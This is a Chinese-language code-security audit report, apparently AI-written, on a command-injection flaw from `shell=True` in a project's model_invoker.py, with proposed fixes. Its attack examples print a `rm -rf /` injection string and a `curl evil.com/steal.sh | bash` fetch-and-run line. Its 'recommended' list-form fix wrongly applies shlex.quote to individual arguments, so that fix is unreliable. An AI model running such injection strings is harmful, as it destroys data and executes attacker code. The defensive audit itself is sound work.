# Shell=True 使用审查报告

生成时间: 2026-01-29
审查人: Claude Code Assistant

---

## 执行摘要

本次审查全面扫描了 AgentOS 项目中所有使用 `shell=True` 的代码，评估了安全风险和跨平台兼容性问题。

### 统计数据

- **总数**: 1个实际使用 (不包括测试/检测代码)
- **高风险**: 1个 ⚠️
- **中风险**: 0个
- **低风险**: 0个

### 关键发现

✅ **好消息**: 项目中绝大多数 subprocess 调用都使用了安全的列表形式，没有使用 `shell=True`

⚠️ **需要关注**: 在 `model_invoker.py` 中发现一处高风险的 `shell=True` 使用，存在命令注入风险

---

## 详细分析

### 🔴 高风险问题

#### 1. 命令注入风险 - model_invoker.py

**文件**: `/Users/pangge/PycharmProjects/AgentOS/agentos/core/model/model_invoker.py`
**行号**: 98-104

**问题代码**:
```python
# 构建命令(替换模板变量)
command = config.cli_command.format(
    model_id=model_id,
    prompt=prompt,
    **kwargs
)

result = subprocess.run(
    command,
    shell=True,
    capture_output=True,
    text=True,
    timeout=kwargs.get("timeout", 60)
)
```

**风险等级**: 🔴 **HIGH** (高危)

**安全问题**:
1. **命令注入漏洞**: 使用 `str.format()` 直接拼接用户输入 (`prompt`, `model_id`, `kwargs`) 到 shell 命令中
2. **无输入验证**: 没有对 `prompt` 参数进行任何转义或验证
3. **shell=True 危险**: 允许 shell 解释特殊字符 (`;`, `|`, `&`, `$()` 等)

**攻击示例**:
```python
# 恶意输入可以执行任意命令
malicious_prompt = "test'; rm -rf /; echo '"
# 生成的命令: codex test'; rm -rf /; echo ''
# 将删除整个文件系统!

malicious_prompt2 = "test | curl evil.com/steal.sh | bash"
# 可以下载并执行恶意脚本
```

**跨平台问题**:
- 依赖 shell 语法，在 Windows 和 Unix 系统上行为不一致
- `config.cli_command` 模板可能包含 Unix 特定的语法

**影响范围**:
- 当前配置的 CLI 工具:
  - `llamacpp`: `"llama-cpp-cli --model {model_id} --prompt {prompt}"`
  - `Codex`: `"codex {prompt}"`
  - `Claude-Code-CLI`: `"claude-code-cli {prompt}"`

---

## 修复建议

### 对于 model_invoker.py (高优先级)

#### 方案 1: 使用列表形式 + shlex.quote (推荐)

```python
import shlex

def invoke_cli(
    self,
    model_id: str,
    brand: str,
    prompt: str,
    config: InvocationConfig,
    **kwargs
) -> Dict[str, Any]:
    """CLI 方式调用 - 修复版本"""
    if not config.cli_command:
        raise ValueError(f"CLI command not configured for {model_id}@{brand}")

    # 将 CLI 命令模板改为列表形式
    # 例如: ["llama-cpp-cli", "--model", "{model_id}", "--prompt", "{prompt}"]
    cmd_template = config.cli_command_list  # 需要添加新字段

    # 安全地替换参数
    cmd = []
    for part in cmd_template:
        if "{model_id}" in part:
            cmd.append(part.replace("{model_id}", shlex.quote(model_id)))
        elif "{prompt}" in part:
            cmd.append(part.replace("{prompt}", shlex.quote(prompt)))
        else:
            cmd.append(part)

    try:
        # 不使用 shell=True
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=kwargs.get("timeout", 60)
        )

        if result.returncode != 0:
            raise RuntimeError(f"CLI command failed: {result.stderr}")

        return {
            "response": result.stdout,
            "method": "cli",
            "metadata": {
                "command": " ".join(cmd),
                "returncode": result.returncode,
                "stderr": result.stderr
            }
        }
    except subprocess.TimeoutExpired:
        raise RuntimeError(f"CLI command timed out")
    except Exception as e:
        raise RuntimeError(f"CLI invocation failed: {e}")
```

**配置更新**:
```python
# 在 model_registry.py 中
BRANDS_INVOCATION_CONFIG = {
    "llamacpp": InvocationConfig(
        method="cli",
        cli_command_list=["llama-cpp-cli", "--model", "{model_id}", "--prompt", "{prompt}"],
        requires_auth=False,
    ),
    "Codex": InvocationConfig(
        method="cli",
        cli_command_list=["codex", "{prompt}"],
        requires_auth=True,
        auth_env_vars=["CODEX_API_KEY"],
    ),
    "Claude-Code-CLI": InvocationConfig(
        method="cli",
        cli_command_list=["claude-code-cli", "{prompt}"],
        requires_auth=True,
        auth_env_vars=["ANTHROPIC_API_KEY"],
    ),
}
```

#### 方案 2: 如果必须使用 shell=True，则使用 shlex.quote

```python
import shlex

def invoke_cli(self, model_id: str, brand: str, prompt: str,
               config: InvocationConfig, **kwargs) -> Dict[str, Any]:
    """CLI 方式调用 - 使用 shlex.quote 转义"""
    if not config.cli_command:
        raise ValueError(f"CLI command not configured for {model_id}@{brand}")

    # 转义所有用户输入
    safe_model_id = shlex.quote(str(model_id))
    safe_prompt = shlex.quote(str(prompt))

    # 构建命令
    command = config.cli_command.format(
        model_id=safe_model_id,
        prompt=safe_prompt,
        **{k: shlex.quote(str(v)) for k, v in kwargs.items()}
    )

    try:
        result = subprocess.run(
            command,
            shell=True,  # 仍有风险，但已最小化
            capture_output=True,
            text=True,
            timeout=kwargs.get("timeout", 60)
        )
        # ... 其余代码相同
```

**注意**: 此方案仍有风险，因为如果 `config.cli_command` 模板本身被污染，仍可能被利用。

---

## 良好实践发现

### ✅ 正确使用示例

项目中绝大多数地方都正确使用了列表形式调用 subprocess:

#### 1. process_manager.py (正确)
```python
command = self._build_command(bin_name, args)  # 返回列表
process = subprocess.Popen(
    command,  # 列表形式
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
)
```

#### 2. ollama_controller.py (正确)
```python
process = subprocess.Popen(
    ["ollama", "serve"],  # 列表形式
    stdout=log_handle,
    stderr=subprocess.STDOUT,
    start_new_session=True,
)
```

#### 3. git client (正确)
```python
result = subprocess.run(
    ["git", "init"],  # 列表形式
    cwd=repo_path,
    check=True,
    capture_output=True
)
```

#### 4. model_registry.py (正确)
```python
result = subprocess.run(
    ["codex", "--version"],  # 列表形式
    capture_output=True,
    text=True,
    timeout=5
)
```

---

## 跨平台兼容性检查

### 检查的文件模式

扫描了所有可能影响跨平台兼容性的模式:

- ✅ **Unix 信号处理**: 已在之前的任务中修复 (使用 `agentos.core.utils.process` 模块)
- ✅ **进程启动**: 都使用列表形式，跨平台兼容
- ✅ **路径处理**: 使用 `pathlib.Path`，跨平台兼容
- ⚠️ **Shell 命令**: 只有 model_invoker.py 存在潜在问题

---

## 建议的实施计划

### 阶段 1: 立即修复 (P0)

1. **修复 model_invoker.py**
   - 实施方案 1 (列表形式 + shlex.quote)
   - 更新 InvocationConfig 数据类，添加 `cli_command_list` 字段
   - 更新所有品牌配置
   - 保持向后兼容性 (如果 cli_command_list 不存在，回退到旧方式但加警告)

2. **添加输入验证**
   - 对 `model_id`, `prompt` 等参数添加长度限制
   - 禁止危险字符 (`;`, `|`, `&`, `$(`, `` ` ``, `>`, `<`)
   - 记录审计日志

3. **添加单元测试**
   - 测试恶意输入被正确处理
   - 测试命令注入攻击场景
   - 测试跨平台兼容性

### 阶段 2: 安全加固 (P1)

1. **添加静态分析检查**
   - 在 CI/CD 中添加 bandit 扫描
   - 检测新的 `shell=True` 使用
   - 使用 semgrep 规则检测不安全的 subprocess 调用

2. **代码审查规则**
   - 将 "禁止使用 shell=True" 添加到代码审查清单
   - 在 PR 模板中添加安全检查项

3. **文档更新**
   - 在开发者指南中添加安全最佳实践
   - 记录 subprocess 的正确使用方式

### 阶段 3: 监控和审计 (P2)

1. **运行时监控**
   - 记录所有 CLI 命令执行
   - 检测异常命令模式
   - 设置告警阈值

2. **定期安全审计**
   - 每季度重新扫描 shell=True 使用
   - 审查外部依赖的安全更新

---

## 参考资料

### 安全资源

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Python subprocess documentation](https://docs.python.org/3/library/subprocess.html#security-considerations)

### Python 最佳实践

```python
# ❌ 危险 - 永远不要这样做
subprocess.run(f"command {user_input}", shell=True)

# ❌ 危险 - 即使使用 format 也不安全
subprocess.run("command {}".format(user_input), shell=True)

# ✅ 安全 - 使用列表形式
subprocess.run(["command", user_input])

# ✅ 安全 - 如果必须使用 shell，用 shlex.quote
import shlex
subprocess.run(f"command {shlex.quote(user_input)}", shell=True)
```

---

## 总结

### 风险评估

| 类别 | 评分 | 说明 |
|------|------|------|
| 当前安全态势 | 🟡 中等 | 只有一处高风险点，但影响重大 |
| 代码质量 | 🟢 良好 | 绝大多数代码遵循最佳实践 |
| 跨平台兼容性 | 🟢 优秀 | 除了 model_invoker.py，其他都兼容 |
| 修复难度 | 🟢 简单 | 修复方案明确，工作量小 |

### 行动项

1. ✅ **已完成**: 审查所有 shell=True 使用
2. ⏳ **待处理**: 修复 model_invoker.py 的命令注入风险
3. ⏳ **待处理**: 添加安全测试用例
4. ⏳ **待处理**: 更新文档和代码审查清单

### 结论

AgentOS 项目在 subprocess 使用方面整体做得很好，绝大多数地方都采用了安全的列表形式调用。唯一的高风险点在 `model_invoker.py` 的 CLI 调用逻辑中，需要立即修复以防止命令注入攻击。

建议优先实施**方案 1**（列表形式），这是最安全且跨平台兼容性最好的方案。修复后，项目的安全态势将从"中等"提升到"优秀"。

---

**报告结束**
